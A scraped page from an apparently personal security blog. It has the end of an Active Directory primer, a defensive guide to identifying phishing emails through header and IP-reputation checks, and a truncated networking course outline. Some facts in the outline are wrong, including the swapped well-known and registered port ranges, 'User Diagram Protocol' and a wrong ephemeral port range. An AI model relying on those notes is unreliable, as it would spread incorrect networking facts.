<p>Active Directory Domain Controllers handles authentication requests and verifies users if they have access to domain resources. Domain Usersâ€™ preference and permissions are defined via group policy set to the Domain Controller.</p>



<h3 class="wp-block-heading">Organizational Unit (OU)</h3>



<p>An organizational unit (OU) is a subdivision within an Active Directory into which you can place users, groups, computers, and other organizational units. You can create organizational units to mirror your organization&#8217;s functional or business structure. Each domain can implement its own organizational unit hierarchy. If your organization contains several domains, you can create organizational unit structures in each domain that are independent of the structures in the other domains.</p>



<hr class="wp-block-separator">



<p>So that ends the first part of the &#8220;Attacking and Defending Active Directory&#8221; series.</p>



<p>I will be posting the second part of this series which is the actual attacks that are being used against active directories next week. </p>



<p>Stay tuned and be safe!</p>



<p><strong>References:</strong></p>



<ul class="wp-block-list">
<li><a href="https://docs.microsoft.com/en-us/windows-server/identity/ad-ds/get-started/virtual-dc/active-directory-domain-services-overview">https://docs.microsoft.com/en-us/windows-server/identity/ad-ds/get-started/virtual-dc/active-directory-domain-services-overview</a></li>
<li><a href="https://www.varonis.com/blog/active-directory-forest/">https://www.varonis.com/blog/active-directory-forest/</a></li>
<li><a href="https://kb.iu.edu/d/atvu">https://kb.iu.edu/d/atvu</a></li>
<li><a href="https://docs.microsoft.com/en-us/windows-server/identity/ad-ds/get-started/virtual-dc/active-directory-domain-services-overview">https://docs.microsoft.com/en-us/windows-server/identity/ad-ds/get-started/virtual-dc/active-directory-domain-services-overview</a></li>
</ul>



<hr class="wp-block-separator">



<p><strong>Subscribe for more!</strong></p>



<p>To stay up to date with my latest posts and more InfoSec guides, make sure to subscribe to this blog by entering your email address below.</p>


	<div class="wp-block-jetpack-subscriptions__supports-newline wp-block-jetpack-subscriptions">
		<div class="wp-block-jetpack-subscriptions__container is-not-subscriber">
							<form action="https://wordpress.com/email-subscriptions" method="post" accept-charset="utf-8" data-blog="174576423" data-post_access_level="everybody" data-subscriber_email="" id="subscribe-blog">
					<div class="wp-block-jetpack-subscriptions__form-elements">
												<p id="subscribe-email">
							<label id="subscribe-field-label" for="subscribe-field" class="screen-reader-text">
								Type your emailâ€¦							</label>
							<input required="required" type="email" name="email" class="no-border-radius " style="font-size: 16px;padding: 15px 23px 15px 23px;border-radius: 0px;border-width: 1px;" placeholder="Type your emailâ€¦" value="" id="subscribe-field" title="Please fill in this field.">						</p>
												<p id="subscribe-submit">
							<input type="hidden" name="action" value="subscribe">
							<input type="hidden" name="blog_id" value="174576423">
							<input type="hidden" name="source" value="/?simply_static_page=1">
							<input type="hidden" name="sub-type" value="subscribe-block">
							<input type="hidden" name="app_source" value="">
							<input type="hidden" name="redirect_fragment" value="subscribe-blog">
							<input type="hidden" name="lang" value="en_US">
							<input type="hidden" id="_wpnonce" name="_wpnonce" value="b537a8bb39"><input type="hidden" name="_wp_http_referer" value="/?simply_static_page=1"><input type="hidden" name="post_id" value="1561">							<button type="submit" class="wp-block-button__link no-border-radius" style="font-size: 16px;padding: 15px 23px 15px 23px;margin: 0; margin-left: 10px;border-radius: 0px;border-width: 1px;" name="jetpack_subscriptions_widget">
								Subscribe							</button>
						</p>
					</div>
				</form>
								</div>
	</div>
	


<p>I promise I won&#8217;t be spamming your mailbox. Because no one loves spam. AMIRIGHT?</p>



<figure class="wp-block-image size-large"><img data-recalc-dims="1" loading="lazy" decoding="async" width="768" height="576" src="https://i0.wp.com/anotsodev.me/wp-content/uploads/2020/04/more-spam.gif?resize=768%2C576&#038;ssl=1" alt="" class="wp-image-1602"></figure>
	</div>
<!-- .entry-content -->

	<footer class="entry-footer">
		<span class="cat-links">Posted in <a href="/category/infosec/" rel="category tag">Information Security</a>, <a href="/category/network-defense/" rel="category tag">Network Defense</a>, <a href="/category/pentesting/" rel="category tag">Penetration Testing</a>, <a href="/category/windows/" rel="category tag">Windows</a></span> | <span class="tags-links">Tagged <a href="/tag/active-directory/" rel="tag">active directory</a>, <a href="/tag/cybersecurity/" rel="tag">cybersecurity</a>, <a href="/tag/information-security/" rel="tag">Information Security</a>, <a href="/tag/penetration-testing/" rel="tag">Penetration Testing</a>, <a href="/tag/windows/" rel="tag">windows</a></span>	</footer><!-- .entry-footer -->
</article><!-- #post-## -->

<article id="post-1246" class="post-1246 post type-post status-publish format-standard has-post-thumbnail hentry category-general category-infosec category-network-defense tag-coins-ph tag-cybersecurity tag-information-security tag-malicious-email tag-mxtoolbox tag-phishing tag-talosintelligence no-featured-image-padding">
	<div class="post-thumbnail">
		<img width="2560" height="2169" src="/wp-content/uploads/2020/04/phishing-scaled.jpg" class="attachment-post-thumbnail size-post-thumbnail wp-post-image" alt="" decoding="async" loading="lazy" srcset="https://i0.wp.com/anotsodev.me/wp-content/uploads/2020/04/phishing-scaled.jpg?w=2560&amp;ssl=1 2560w, https://i0.wp.com/anotsodev.me/wp-content/uploads/2020/04/phishing-scaled.jpg?resize=300%2C254&amp;ssl=1 300w, https://i0.wp.com/anotsodev.me/wp-content/uploads/2020/04/phishing-scaled.jpg?resize=1024%2C868&amp;ssl=1 1024w, https://i0.wp.com/anotsodev.me/wp-content/uploads/2020/04/phishing-scaled.jpg?resize=768%2C651&amp;ssl=1 768w, https://i0.wp.com/anotsodev.me/wp-content/uploads/2020/04/phishing-scaled.jpg?resize=1536%2C1302&amp;ssl=1 1536w, https://i0.wp.com/anotsodev.me/wp-content/uploads/2020/04/phishing-scaled.jpg?resize=2048%2C1736&amp;ssl=1 2048w, https://i0.wp.com/anotsodev.me/wp-content/uploads/2020/04/phishing-scaled.jpg?w=2340&amp;ssl=1 2340w" sizes="auto, (max-width: 2560px) 100vw, 2560px">	</div>
	<header class="entry-header">
		<h2 class="entry-title"><a href="/how-to-identify-phishing-emails/" rel="bookmark">How to identify phishing emails</a></h2>		<div class="entry-meta">
			<span class="posted-on">Posted on <a href="/how-to-identify-phishing-emails/" rel="bookmark"><time class="entry-date published" datetime="2020-04-11T19:31:15+08:00">April 11, 2020</time></a></span> | <span class="byline"> by <span class="author vcard"><a class="url fn n" href="/author/anotsodev/">anotsodev</a></span></span> | <span class="comments-link"><i class="fa fa-comments" aria-hidden="true"></i> <a href="/how-to-identify-phishing-emails/#respond">Leave a Comment<span class="screen-reader-text"> on How to identify phishing emails</span></a></span>		</div>
<!-- .entry-meta -->
			</header><!-- .entry-header -->
	<div class="entry-content">
		
<p>This blog post will help you identify phishing emails and learn what are the tools being used in checking if the sender and links are legitimate.</p>



<p>The scenario in the next section will tell you the example of phishing email attacks and their consequences.</p>



<p>So let&#8217;s say you have received an email that is very similar to the services that you are frequently using. For example, from Paypal saying that someone logged in to your account, or from coins.ph (digital wallet used in the Philippines) saying that you have an unclaimed reward because you and your friends are verified.</p>



<p>Since it has gotten your attention and you are indeed convinced that you have a reward waiting to be claimed, you unknowingly ignored the red flags such as the email address of the sender and the inconsistencies of the email format. So you clicked the button and it redirected you to a familiar site but with an unfamiliar URL. Now you entered your credentials and clicked the login button but instead of prompting you to enter the authentication code from your 2FA device, it redirected you to the real site of that service you are using.</p>



<p>Now you are wondering, what happened? Let me tell you&#8230;</p>



<p><strong>You just got phished!</strong></p>



<p>The fake site where you entered your credentials has already gotten your login information. Your email address, your username, and password. Everything.</p>



<p>So if you are using similar credentials to other services, you are basically <em>f&#8217;d</em> <em>up</em>.</p>



<p>Now, to protect you and help you to be vigilant. Take your time to read this post and familiarize yourself with several characteristics about the emails that you have received that would indicate that these could be phishing emails.</p>



<p>This post will cover the basic approach to identify phishing emails.</p>



<p>Just to give you the overview, here&#8217;s the outline of this post.</p>



<ul class="wp-block-list">
<li>Identify phishing emails by Internet Headers analysis and Email Reputation Lookup</li>
<li>Containment Approaches</li>
<li>Summary</li>
</ul>



<h2 class="wp-block-heading">Identify phishing emails by Internet Headers analysis and Email Reputation Lookup</h2>



<p>In this section, you will learn how to analyze headers and identify the source IP of the sender or the relay server that they have used to send the phishing email.</p>



<p>We&#8217;ll be using this tool called <a rel="noreferrer noopener" href="https://mxtoolbox.com/EmailHeaders.aspx" target="_blank">MxToolbox</a>. You may read the brief description from their site to learn more.</p>



<blockquote class="wp-block-quote is-layout-flow wp-block-quote-is-layout-flow">
<p>ABOUT EMAIL HEADERS</p>
<cite>This tool will make email headers human readable by parsing them according to RFC 822.&nbsp; Email headers are present on every email you receive via the Internet and can provide valuable diagnostic information like hop delays, anti-spam results and more.</cite>
</blockquote>



<figure class="wp-block-image size-large"><img loading="lazy" decoding="async" width="1889" height="687" src="https://i0.wp.com/anotsodev.me/wp-content/uploads/2020/04/image.png?fit=1024%2C372&amp;ssl=1" alt="" class="wp-image-1250" srcset="https://i0.wp.com/anotsodev.me/wp-content/uploads/2020/04/image.png?w=1889&amp;ssl=1 1889w, https://i0.wp.com/anotsodev.me/wp-content/uploads/2020/04/image.png?resize=300%2C109&amp;ssl=1 300w, https://i0.wp.com/anotsodev.me/wp-content/uploads/2020/04/image.png?resize=1024%2C372&amp;ssl=1 1024w, https://i0.wp.com/anotsodev.me/wp-content/uploads/2020/04/image.png?resize=768%2C279&amp;ssl=1 768w, https://i0.wp.com/anotsodev.me/wp-content/uploads/2020/04/image.png?resize=1536%2C559&amp;ssl=1 1536w" sizes="auto, (max-width: 1170px) 100vw, 1170px"><figcaption>MxToolbox Email Header Analyzer</figcaption></figure>



<p>So before we use this tool, let&#8217;s get first the internet headers from the suspected phishing email. I will be using the internet headers of the email that was sent to my Protonmail address.</p>



<figure class="wp-block-image size-large"><img data-recalc-dims="1" loading="lazy" decoding="async" width="1008" height="808" src="https://i0.wp.com/anotsodev.me/wp-content/uploads/2020/04/image-1.png?resize=1008%2C808&#038;ssl=1" alt="" class="wp-image-1251" srcset="https://i0.wp.com/anotsodev.me/wp-content/uploads/2020/04/image-1.png?w=1008&amp;ssl=1 1008w, https://i0.wp.com/anotsodev.me/wp-content/uploads/2020/04/image-1.png?resize=300%2C240&amp;ssl=1 300w, https://i0.wp.com/anotsodev.me/wp-content/uploads/2020/04/image-1.png?resize=768%2C616&amp;ssl=1 768w" sizes="auto, (max-width: 1008px) 100vw, 1008px"><figcaption>Coins.ph phishing email sent to Protonmail</figcaption></figure>



<figure class="wp-block-image size-large"><img loading="lazy" decoding="async" width="1600" height="808" src="https://i0.wp.com/anotsodev.me/wp-content/uploads/2020/04/image-2.png?fit=1024%2C517&amp;ssl=1" alt="" class="wp-image-1252" srcset="https://i0.wp.com/anotsodev.me/wp-content/uploads/2020/04/image-2.png?w=1600&amp;ssl=1 1600w, https://i0.wp.com/anotsodev.me/wp-content/uploads/2020/04/image-2.png?resize=300%2C152&amp;ssl=1 300w, https://i0.wp.com/anotsodev.me/wp-content/uploads/2020/04/image-2.png?resize=1024%2C517&amp;ssl=1 1024w, https://i0.wp.com/anotsodev.me/wp-content/uploads/2020/04/image-2.png?resize=768%2C388&amp;ssl=1 768w, https://i0.wp.com/anotsodev.me/wp-content/uploads/2020/04/image-2.png?resize=1536%2C776&amp;ssl=1 1536w" sizes="auto, (max-width: 1170px) 100vw, 1170px"><figcaption>Example email sent to Gmail</figcaption></figure>



<p>You may view the internet headers of your email on Protonmail by clicking the dropdown button then <strong>View Headers</strong>. On gmail, click the &#8216;kebab&#8217; (<em>three</em>&nbsp;vertical&nbsp;<em>dots</em>) button then Show original.</p>



<p>After clicking the <strong>View Headers</strong> or <strong>Show Original</strong> button, just copy all the content then paste it to the email header analyzer tool then click the Analyze Header button.</p>



<p>After you submit the internet headers for analysis, you&#8217;ll see this page which contains the summary of the analysis.</p>



<figure class="wp-block-image size-large"><img loading="lazy" decoding="async" width="1490" height="733" src="https://i0.wp.com/anotsodev.me/wp-content/uploads/2020/04/image-3.png?fit=1024%2C504&amp;ssl=1" alt="" class="wp-image-1254" srcset="https://i0.wp.com/anotsodev.me/wp-content/uploads/2020/04/image-3.png?w=1490&amp;ssl=1 1490w, https://i0.wp.com/anotsodev.me/wp-content/uploads/2020/04/image-3.png?resize=300%2C148&amp;ssl=1 300w, https://i0.wp.com/anotsodev.me/wp-content/uploads/2020/04/image-3.png?resize=1024%2C504&amp;ssl=1 1024w, https://i0.wp.com/anotsodev.me/wp-content/uploads/2020/04/image-3.png?resize=768%2C378&amp;ssl=1 768w" sizes="auto, (max-width: 1170px) 100vw, 1170px"><figcaption>Header Analysis Summary</figcaption></figure>



<p>On this email, you may notice that the sender used Gmail to send his/her phishing email</p>



<p>Since we know that Gmail IPs are reputable and are not really dangerous, let&#8217;s just use another phishing email internet header for the sake of demonstrating the identification of dangerous sender&#8217;s source IP.</p>



<figure class="wp-block-image size-full"><img data-recalc-dims="1" loading="lazy" decoding="async" width="1170" height="267" src="https://i0.wp.com/anotsodev.me/wp-content/uploads/2020/04/image-4.png?resize=1170%2C267&#038;ssl=1" alt="" class="wp-image-1255" srcset="https://i0.wp.com/anotsodev.me/wp-content/uploads/2020/04/image-4.png?w=1870&amp;ssl=1 1870w, https://i0.wp.com/anotsodev.me/wp-content/uploads/2020/04/image-4.png?resize=300%2C68&amp;ssl=1 300w, https://i0.wp.com/anotsodev.me/wp-content/uploads/2020/04/image-4.png?resize=1024%2C233&amp;ssl=1 1024w, https://i0.wp.com/anotsodev.me/wp-content/uploads/2020/04/image-4.png?resize=768%2C175&amp;ssl=1 768w, https://i0.wp.com/anotsodev.me/wp-content/uploads/2020/04/image-4.png?resize=1536%2C350&amp;ssl=1 1536w" sizes="auto, (max-width: 1170px) 100vw, 1170px"><figcaption>Email sent from blacklisted/spammer IP</figcaption></figure>



<p>So you may notice that the sender&#8217;s IP is <strong>185.234.219.119</strong>. We can copy the IP address to check its reputation using open-source intelligence services such as <strong><a rel="noreferrer noopener" href="https://talosintelligence.com/" target="_blank">Talos Intelligence</a> </strong>by Cisco.</p>



<figure class="wp-block-image size-full"><img data-recalc-dims="1" loading="lazy" decoding="async" width="1170" height="768" src="https://i0.wp.com/anotsodev.me/wp-content/uploads/2020/04/image-5.png?resize=1170%2C768&#038;ssl=1" alt="" class="wp-image-1256" srcset="https://i0.wp.com/anotsodev.me/wp-content/uploads/2020/04/image-5.png?w=1390&amp;ssl=1 1390w, https://i0.wp.com/anotsodev.me/wp-content/uploads/2020/04/image-5.png?resize=300%2C197&amp;ssl=1 300w, https://i0.wp.com/anotsodev.me/wp-content/uploads/2020/04/image-5.png?resize=1024%2C673&amp;ssl=1 1024w, https://i0.wp.com/anotsodev.me/wp-content/uploads/2020/04/image-5.png?resize=768%2C504&amp;ssl=1 768w" sizes="auto, (max-width: 1170px) 100vw, 1170px"><figcaption>IP Reputation Lookup result</figcaption></figure>



<p>By using this tool, you can see details such as the location, reputation, owner, content, and blacklists that may help you to assess how dangerous the sender is.</p>



<p>Now, let&#8217;s move back to the MxToolbox analysis result to get more details about the email.</p>



<figure class="wp-block-image size-full"><img data-recalc-dims="1" loading="lazy" decoding="async" width="1170" height="532" src="https://i0.wp.com/anotsodev.me/wp-content/uploads/2020/04/image-7.png?resize=1170%2C532&#038;ssl=1" alt="" class="wp-image-1258" srcset="https://i0.wp.com/anotsodev.me/wp-content/uploads/2020/04/image-7.png?w=1870&amp;ssl=1 1870w, https://i0.wp.com/anotsodev.me/wp-content/uploads/2020/04/image-7.png?resize=300%2C137&amp;ssl=1 300w, https://i0.wp.com/anotsodev.me/wp-content/uploads/2020/04/image-7.png?resize=1024%2C466&amp;ssl=1 1024w, https://i0.wp.com/anotsodev.me/wp-content/uploads/2020/04/image-7.png?resize=768%2C350&amp;ssl=1 768w, https://i0.wp.com/anotsodev.me/wp-content/uploads/2020/04/image-7.png?resize=1536%2C699&amp;ssl=1 1536w" sizes="auto, (max-width: 1170px) 100vw, 1170px"><figcaption>Headers Found</figcaption></figure>



<p>You may notice that the display name of the sender is not consistent compared to his/her email address. So this will hint us that the email is not really legitimate.</p>



<p>For the header name starting with &#8220;X-&#8220;, these are custom header and proprietary set by relay servers or mail gateways.</p>



<p>Let&#8217;s now move on to the next section, which is the containment approaches if you unknowingly entered your credentials to the phishing site.</p>



<h2 class="wp-block-heading">Containment Approaches</h2>



<p>Let&#8217;s say you have entered your credentials to the phishing site and redirected you to the official site, you kept wondering why it did not prompt you to enter 2FA code. You checked again the email and saw that the sender&#8217;s details are not consistent, you have realized that you have entered your credentials to a phishing site since you did not notice the URL since you were using your phone when you clicked the link embedded on the email.</p>



<p>So what should you do about this incident?</p>



<p>These are the steps that you <strong>MUST</strong> do to contain and prevent the attacker to abuse your credentials:</p>



<ol class="wp-block-list">
<li>Install a password manager (1password, Enpass, or Bitwarden) then generate hard to guess password then change your password immediately</li>
<li>Log-out all the sessions of your account</li>
<li>If you are using similar login details on other services, change their passwords immediately</li>
<li>Install virus scanner software then run a full scan in case of malicious executables downloaded on your device</li>
<li>Delete the email on your inbox</li>
</ol>



<p>After doing these steps, you have now ensured that your account is safe again and won&#8217;t be abused by the attacker.</p>



<h2 class="wp-block-heading">Summary</h2>



<p>Just to summarize the topics that I&#8217;ve discussed here, we tackled how to spot phishing emails by checking the internet headers and using tools such as <strong>MxToolbox </strong>and <strong>Talos Intelligence</strong> to aid us with our analysis. Lastly, we tackled the necessary steps in securing your account again after being a victim of phishing.</p>



<p>So that&#8217;s it! I hope you have learned new technologies and tools by reading this blog post. I will be posting more guides and tutorials again soon whenever I have time.</p>



<p>May the force be with you.</p>



<p></p>



<p><a href="https://www.freepik.com/free-photos-vectors/abstract">Featured Image created by katemangostar &#8211; www.freepik.com</a></p>



<hr class="wp-block-separator">



<p><strong>Subscribe for more!</strong></p>



<p>To stay up to date with my latest posts and more InfoSec guides, make sure to subscribe to this blog by entering your email address below.</p>


	<div class="wp-block-jetpack-subscriptions__supports-newline wp-block-jetpack-subscriptions">
		<div class="wp-block-jetpack-subscriptions__container is-not-subscriber">
							<form action="https://wordpress.com/email-subscriptions" method="post" accept-charset="utf-8" data-blog="174576423" data-post_access_level="everybody" data-subscriber_email="" id="subscribe-blog-2">
					<div class="wp-block-jetpack-subscriptions__form-elements">
												<p id="subscribe-email">
							<label id="subscribe-field-2-label" for="subscribe-field-2" class="screen-reader-text">
								Type your emailâ€¦							</label>
							<input required="required" type="email" name="email" class="no-border-radius " style="font-size: 16px;padding: 15px 23px 15px 23px;border-radius: 0px;border-width: 1px;" placeholder="Type your emailâ€¦" value="" id="subscribe-field-2" title="Please fill in this field.">						</p>
												<p id="subscribe-submit">
							<input type="hidden" name="action" value="subscribe">
							<input type="hidden" name="blog_id" value="174576423">
							<input type="hidden" name="source" value="/?simply_static_page=1">
							<input type="hidden" name="sub-type" value="subscribe-block">
							<input type="hidden" name="app_source" value="">
							<input type="hidden" name="redirect_fragment" value="subscribe-blog-2">
							<input type="hidden" name="lang" value="en_US">
							<input type="hidden" id="_wpnonce" name="_wpnonce" value="b537a8bb39"><input type="hidden" name="_wp_http_referer" value="/?simply_static_page=1"><input type="hidden" name="post_id" value="1246">							<button type="submit" class="wp-block-button__link no-border-radius" style="font-size: 16px;padding: 15px 23px 15px 23px;margin: 0; margin-left: 10px;border-radius: 0px;border-width: 1px;" name="jetpack_subscriptions_widget">
								Subscribe							</button>
						</p>
					</div>
				</form>
								</div>
	</div>
	


<p>I promise I won&#8217;t be spamming your mailbox. Because no one loves spam. AMIRIGHT?</p>



<figure class="wp-block-image size-large"><img data-recalc-dims="1" loading="lazy" decoding="async" width="768" height="576" src="https://i0.wp.com/anotsodev.me/wp-content/uploads/2020/04/more-spam.gif?resize=768%2C576&#038;ssl=1" alt="" class="wp-image-1602"></figure>
	</div>
<!-- .entry-content -->

	<footer class="entry-footer">
		<span class="cat-links">Posted in <a href="/category/general/" rel="category tag">General</a>, <a href="/category/infosec/" rel="category tag">Information Security</a>, <a href="/category/network-defense/" rel="category tag">Network Defense</a></span> | <span class="tags-links">Tagged <a href="/tag/coins-ph/" rel="tag">coins.ph</a>, <a href="/tag/cybersecurity/" rel="tag">cybersecurity</a>, <a href="/tag/information-security/" rel="tag">Information Security</a>, <a href="/tag/malicious-email/" rel="tag">malicious email</a>, <a href="/tag/mxtoolbox/" rel="tag">mxtoolbox</a>, <a href="/tag/phishing/" rel="tag">phishing</a>, <a href="/tag/talosintelligence/" rel="tag">talosintelligence</a></span>	</footer><!-- .entry-footer -->
</article><!-- #post-## -->

<article id="post-1155" class="post-1155 post type-post status-publish format-standard has-post-thumbnail hentry category-cheatsheets category-networking tag-course tag-cybersecurity tag-information-security tag-networking tag-pluralsight tag-protocols no-featured-image-padding">
	<div class="post-thumbnail">
		<img width="3040" height="2027" src="/wp-content/uploads/2020/03/Cloud-Network.png" class="attachment-post-thumbnail size-post-thumbnail wp-post-image" alt="" decoding="async" loading="lazy" srcset="https://i0.wp.com/anotsodev.me/wp-content/uploads/2020/03/Cloud-Network.png?w=3040&amp;ssl=1 3040w, https://i0.wp.com/anotsodev.me/wp-content/uploads/2020/03/Cloud-Network.png?resize=300%2C200&amp;ssl=1 300w, https://i0.wp.com/anotsodev.me/wp-content/uploads/2020/03/Cloud-Network.png?resize=1024%2C683&amp;ssl=1 1024w, https://i0.wp.com/anotsodev.me/wp-content/uploads/2020/03/Cloud-Network.png?resize=768%2C512&amp;ssl=1 768w, https://i0.wp.com/anotsodev.me/wp-content/uploads/2020/03/Cloud-Network.png?resize=1536%2C1024&amp;ssl=1 1536w, https://i0.wp.com/anotsodev.me/wp-content/uploads/2020/03/Cloud-Network.png?resize=2048%2C1366&amp;ssl=1 2048w, https://i0.wp.com/anotsodev.me/wp-content/uploads/2020/03/Cloud-Network.png?w=2340&amp;ssl=1 2340w" sizes="auto, (max-width: 3040px) 100vw, 3040px">	</div>
	<header class="entry-header">
		<h2 class="entry-title"><a href="/networking-concepts-and-protocols/" rel="bookmark">Networking Concepts and Protocols</a></h2>		<div class="entry-meta">
			<span class="posted-on">Posted on <a href="/networking-concepts-and-protocols/" rel="bookmark"><time class="entry-date published" datetime="2020-03-29T12:59:03+08:00">March 29, 2020</time></a></span> | <span class="byline"> by <span class="author vcard"><a class="url fn n" href="/author/anotsodev/">anotsodev</a></span></span> | <span class="comments-link"><i class="fa fa-comments" aria-hidden="true"></i> <a href="/networking-concepts-and-protocols/#respond">Leave a Comment<span class="screen-reader-text"> on Networking Concepts and Protocols</span></a></span>		</div>
<!-- .entry-meta -->
			</header><!-- .entry-header -->
	<div class="entry-content">
		
<p>This blog post contains the Networking Concepts and Protocols course that can be enrolled in Pluralsight. Feel free to skim this outline to get a high-level overview of the topics that were discussed on the course.</p>


<h2>Introduction</h2>
<ul>
<li>What is networking?</li>
<li>Concepts</li>
<li>Modeling network communication</li>
</ul>
<h2>Data Networking</h2>
<ul>
<li>Data moving from a device to another device</li>
</ul>
<h2>Understanding Data Networking</h2>
<div>
<ul>
<li>protocols to protocols</li>
</ul>
<h3>Modeling Systems</h3>
<ul>
<li style="list-style-type: none;">
<ul>
<li>
<div>Concept</div>
</li>
<li>
<div>Language</div>
</li>
<li>
<div>Link</div>
</li>
<li>
<div>Physical</div>
</li>
</ul>
</li>
</ul>
<h3>The OSI Model</h3>
</div>
<ul>
<li>
<div>Open Systems Interconnect</div>
</li>
</ul>
<h4>Physical Layer (Layer 1)</h4>
<ul>
<li>
<div>Physical Devices</div>
</li>
<li>
<div>Cables</div>
<ul>
<li>
<div>Twisted Pair</div>
</li>
<li>
<div>CoAx</div>
</li>
<li>
<div>Fiber Optics</div>
</li>
<li>
<div>Copper</div>
</li>
</ul>
</li>
</ul>
<h4>Data Link Layer (Layer 2)</h4>
<ul>
<li>
<div>Ethernet</div>
</li>
<li>
<div>DOCSIS-3 (ISP to Internet)</div>
</li>
<li>
<div>Move data from one device to another device</div>
</li>
</ul>
<h4>Network Layer (Layer 3)</h4>
<ul>
<li>
<div>IP Addressing</div>
</li>
<li>
<div>IP Routing</div>
</li>
</ul>
<h4>Transport Layer (Layer 4)</h4>
<ul>
<li>
<div>Session between client and server</div>
</li>
<li>
<div>TCP &#8211; Transmission Control Protocol</div>
</li>
<li>
<div>UDP &#8211; User Diagram Protocol</div>
</li>
</ul>
<h4>Session Layer (Layer 5)</h4>
<h4>Presentation Layer (Layer 6)</h4>
<ul>
<li>
<div>Decoding ASCII</div>
</li>
<li>
<div>EBCDIC (IBM Encoding)</div>
</li>
</ul>
<h4>Application Layer (Layer 7)</h4>
<ul>
<li>
<div>HTTP</div>
</li>
<li>
<div>HTTPS</div>
</li>
</ul>
<h2>Protocols and Port Numbers</h2>
<h4>Application Layer Protocols (Layer 7)</h4>
<ul>
<li>
<div>Transferring Data</div>
</li>
<li>
<div>Hypertext Transfer Protocols</div>
<ul>
<li>
<div>HTTP (Layer 4 port: 80)</div>
</li>
<li>
<div>HTTPS (Layer 4 port: 443)</div>
</li>
</ul>
</li>
<li>
<div>File Transfer Protocols</div>
<ul>
<li>
<div>FTP (Port 20)</div>
</li>
<li>
<div>sFTP (Port 22)</div>
<ul>
<li>
<div>FTP over SSH</div>
</li>
</ul>
</li>
<li>
<div>TrivialFTP (Port 69)</div>
<ul>
<li>
<div>Used to transfer files without authentication</div>
</li>
</ul>
</li>
<li>
<div>SMB (Port 445)</div>
</li>
</ul>
</li>
<li>
<div>Email Protocols</div>
<ul>
<li>
<div>SMTP (Port 25/465/587)</div>
<ul>
<li>
<div>Used for outbound emails</div>
</li>
</ul>
</li>
<li>
<div>POP3 (Port 110/995) /IMAP (Port 143/993)</div>
<ul>
<li>
<div>Used for inbound emails</div>
</li>
</ul>
</li>
</ul>
</li>
<li>
<div>Authentication Protocols</div>
<ul>
<li>
<div>LDAP (Port 389)</div>
</li>
<li>
<div>LDAPs (Port 636)</div>
</li>
</ul>
</li>
<li>
<div>Network Services</div>
<ul>
<li>
<div>DHCP</div>
</li>
<li>
<div>DNS</div>
</li>
<li>
<div>NTP</div>
</li>
</ul>
</li>
<li>
<div>Network Management</div>
<ul>
<li>
<div>Telnet</div>
</li>
<li>
<div>SSH</div>
</li>
<li>
<div>SNMP</div>
</li>
<li>
<div>RDP</div>
</li>
</ul>
</li>
<li>
<div>Audio/Video Protocols</div>
<ul>
<li>
<div>H.323</div>
</li>
<li>
<div>1720</div>
</li>
<li>
<div>SIP</div>
</li>
</ul>
</li>
</ul>
<h4>Transport Layer Protocols (Layer 4)</h4>
<ul>
<li>
<div>TCP</div>
<ul>
<li>
<div>Transmission Control Protocol</div>
</li>
<li>
<div>Uses 3-way handshake to establish session with other devices</div>
<ul>
<li>
<div>SYN &#8211; SYN/ACK &#8211; ACK</div>
</li>
</ul>
</li>
<li>
<div>Uses 4-way disconnect to end established session with other devices</div>
<ul>
<li>
<div>FIN &#8211; FIN/ACK &#8211; FIN &#8211; FIN/ACK</div>
</li>
<li>
<div>RST</div>
<ul>
<li>
<div>Immediately end established session</div>
</li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
<li>
<div>UDP</div>
<ul>
<li>
<div>User Diagram Protocol</div>
</li>
<li>
<div>Only sent packets without any sequence</div>
</li>
<li>
<div>Does not establish session</div>
</li>
</ul>
</li>
</ul>
<h4>Transport Layer Addressing</h4>
<ul>
<li>
<div>Port Numbers</div>
</li>
<li>
<div>Server Port Numbers (Registered/Well known)</div>
<ul>
<li>
<div>Registered &#8211; 0-1023</div>
</li>
<li>
<div>Well Known &#8211; 1024 &#8211; 49151</div>
</li>
</ul>
</li>
<li>
<div>Client Port Numbers (Temporary)</div>
<ul>
<li>
<div>49152 &#8211; 61535</div>
</li>
</ul>
</li>
</ul>
<h2>Binary and Hexadecimal</h2>
<ul>
<li>
<div>Base 2 (0 &#8211; 1)</div>
</li>
<li>
<div>Base 10 (0 &#8211; 9)</div>
</li>
<li>
<div>Base 16 (0 &#8211; 15) (0 &#8211; F)</div>
</li>
</ul>
<h2>Introduction to IP Addressing</h2>
<ul>
<li>
<div>Classful</div>
</li>
<li>
<div>Classless</div>
</li>
<li>
<div>What is an IP address?</div>
<ul>
<li>
<div>[ 192.168.1 ] &#8211; Network Portion [ .1 ] &#8211; Host Portion</div>
</li>
</ul>
</li>
<li>
<div>Classless Addressing</div>
<ul>
<li>
<div>Subnet Mask</div>
<ul>
<li>
<div>Network portion where all bits are filled</div>
</li>
</ul>
</li>
</ul>
</li>
<li>
<div>Classful Addressing</div>
<ul>
<li>
<div>Unicast</div>
<ul>
<li>
<div>Class A</div>
</li>
<li>
<div>Class B</div>
</li>
<li>
<div>Class C</div>
</li>
</ul>
</li>
<li>
<div>Multicast</div>
<ul>
<li>
<div>Class D</div>
</li>
</ul>
</li>
</ul>
</li>
<li>
<div>Address Types</div>
<ul>
<li>
<div>IP Address Types</div>
<ul>
<li>
<div>Network Address</div>
<ul>
<li>
<div>Identifier for a group of devices</div>
</li>
</ul>
</li>
<li>
<div>Broadcast Address</div>
<ul>
<li>
<div>Identifier for all devices on a network</div>
</li>
</ul>
</li>
<li>
<div>Host Address</div>
<ul>
<li>
<div>Identifies unique device on a network</div>
</li>
</ul>
</li>
</ul>
</li>
<li>
<div>Network Address</div>
</li>
<li>
<div>CIDR Notation</div>
<ul>
<li>
<div>Example: 10.1.1.0/24</div>
</li>
</ul>
</li>
</ul>
</li>
<li>
<div>Subnetting Networks</div>
<ul>
<li>
<div>Variable Length Subnet Masking</div>
</li>
</ul>
</li>
<li>
<div>Introduction to IPV6</div>
<ul>
<li>
<div>128 bits long</div>
</li>
<li>
<div>32 nibbles</div>
</li>
<li>
<div>8 hextets</div>
</li>
<li>
<div>Network Portion = 64 bits</div>
</li>
<li>
<div>Interface Identifier = 64 bits</div>
</li>
<li>
<div>Leading 0&#8217;s = ::</div>
</li>
<li>
<div>2^64 available hosts</div>
</li>
<li>
<div>Additional Details</div>
<ul>
<li>
<div>Dual Stack</div>
</li>
<li>
<div>Unicast Address</div>
</li>
<li>
<div>fe80 = Link Local Address</div>
</li>
</ul>
</li>
<li>
<div>IPV6 Address Acquisition</div>
<ul>
<li>
<div>SLAAC</div>
<ul>
<li>
